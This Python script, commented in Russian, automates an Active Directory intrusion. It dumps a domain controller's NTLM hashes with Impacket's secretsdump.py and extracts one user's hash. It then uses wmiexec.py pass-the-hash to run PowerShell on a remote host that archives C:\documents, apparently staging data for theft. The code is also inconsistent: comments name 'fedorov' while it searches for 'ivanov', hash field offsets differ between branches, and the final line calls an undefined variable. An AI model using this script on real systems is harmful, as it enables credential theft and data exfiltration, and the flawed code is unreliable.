# -*- coding: cp1251 -*-
import subprocess
import re
import sys
import os

if len(sys.argv) < 6:
    print("Использование: python script.py <domain> <username> <password> <dc_ip> <target_computer>")
    sys.exit(1)

domain = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
dc_ip = sys.argv[4]
target_computer = sys.argv[5]

# Проверяем, есть ли уже пользователь fedorov в файле hashes.txt
user_hash = None
try:
    with open("hashes.txt", "r") as file:
        lines = file.readlines()

    for line in lines:
        if re.search(r'^ivanov:', line):
            user_hash = line.split(':')[2] + ':' + line.split(':')[3]  # Получение хэша пароля
            break
except FileNotFoundError:
    pass  # Если файл hashes.txt еще не существует

# Если пользователь fedorov не найден в файле, выполняем извлечение хэшей паролей
if user_hash is None:
    # Команда для запуска secretsdump.py
    secretsdump_command = f"secretsdump.py -just-dc-ntlm {domain}/{username}:{password}@{dc_ip}"

    # Выполнение команды и сохранение вывода в файл
    with open("hashes.txt", "w") as outfile:
        subprocess.run(secretsdump_command, shell=True, check=True, stdout=outfile)

    print("Хэши паролей сохранены в файл hashes.txt")

    # Чтение файла и поиск пользователя 'fedorov'
    with open("hashes.txt", "r") as file:
        lines = file.readlines()

    for line in lines:
        if re.search(r'^ivanov:', line):
            user_hash = line.split(':')[3] + ':' + line.split(':')[4] # Получение хэша пароля
            break

    if user_hash is None:
        print("Пользователь fedorov не найден в полученных хэшах.")
        exit(1)

win_exec = f'wmiexec.py -hashes {user_hash} company/ivanov@10.69.4.5 "powershell.exe Compress-Archive -Path \'C:\\documents\\*\' -DestinationPath \'C:\\documents.zip\'"'
subprocess.run(win_exec, shell=True)


subprocess.run(win_exec_smb, shell=True)
